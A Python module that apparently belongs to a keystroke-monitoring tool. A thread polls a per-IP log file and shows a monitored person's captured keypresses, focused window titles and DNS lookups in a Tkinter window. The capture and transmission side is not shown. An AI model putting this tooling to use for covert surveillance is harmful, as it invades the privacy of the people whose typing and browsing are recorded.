import threading
import time
import os


MONITOR_POS_KEY = 0
MONITOR_POS_NAME = 1
MONITOR_POS_IP = 2
MONITOR_POS_ADMIN_KEY = 3


class ClientFileThread(threading.Thread):
    def __init__(self, monitor, person_page):
        threading.Thread.__init__(self)
        self.monitor = monitor
        self.person_page = person_page
        this_folder = os.path.dirname(os.path.abspath(__file__))
        self.filename = os.path.join(
            this_folder, f"files/{monitor[MONITOR_POS_IP]}.txt"
        )
        self._stop_event = threading.Event()

    def stop(self):
        self._stop_event.set()

    def stopped(self):
        return self._stop_event.is_set()

    def read_last_line(self):
        last_line = None
        if not os.path.exists(self.filename):
            return None

        with open(self.filename, "rb") as f:
            try:  # catch OSError in case of a one line file
                f.seek(-2, os.SEEK_END)
                while f.read(1) != b"\n":
                    f.seek(-2, os.SEEK_CUR)
            except OSError:
                f.seek(0)
            last_line = f.readline().decode()

        return last_line

    def run(self):
        while not self.stopped():
            time.sleep(1)
            data = self.read_last_line()

            if data:
                data_split = data.split(":", 3)
                try:
                    match data_split[1]:
                        case "[keypress]":
                            data = data_split[2].replace("[space]", " ")
                            self.person_page.update_text(data)
                        case "[focused_window]":
                            self.person_page.update_window_text(data_split[2])
                        case "[PORT 53]":
                            self.person_page.update_dns_text(data_split[2])

                # updating Tkinter with an outside thread is not recommended-
                # as tkinter is not thread safe. However, I use it here as a workaround-
                # is unavilable\not practical for this project currently.
                # for now, catching the exception and continuing is all thats possible.
                except RuntimeError as e:
                    pass
